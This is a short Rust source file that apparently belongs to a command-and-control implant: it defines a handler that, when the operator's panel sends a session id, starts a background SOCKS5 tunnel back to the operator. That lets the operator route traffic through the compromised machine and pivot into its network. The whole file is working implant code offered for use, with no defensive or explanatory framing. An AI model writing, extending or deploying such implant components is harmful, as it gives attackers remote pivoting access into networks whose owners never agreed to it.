// implant/src/commands/socks5.rs
use super::CommandHandler;
use crate::config::Config;
use anyhow::Result;
use serde_json::Value;
use std::sync::Arc;
use uuid::Uuid;

pub struct Socks5StartHandler {
    config: Arc<Config>,
}

impl Socks5StartHandler {
    pub fn new(config: Config) -> Self {
        Self {
            config: Arc::new(config),
        }
    }
}

impl CommandHandler for Socks5StartHandler {
    fn execute(&self, args: Value) -> Result<Value> {
        // Panel assigns session_id so it can match the incoming WS connection
        let session_id = args["session_id"]
            .as_str()
            .map(|s| s.to_string())
            .unwrap_or_else(|| Uuid::new_v4().to_string());
        let cfg = Arc::clone(&self.config);
        let sid = session_id.clone();
        tokio::spawn(async move {
            if let Err(e) = crate::tunnel_client::run_tunnel(&cfg, "socks5", &sid).await {
                eprintln!("[!] SOCKS5 tunnel: {e}");
            }
        });
        Ok(serde_json::json!({"status": "started", "session_id": session_id}))
    }
}
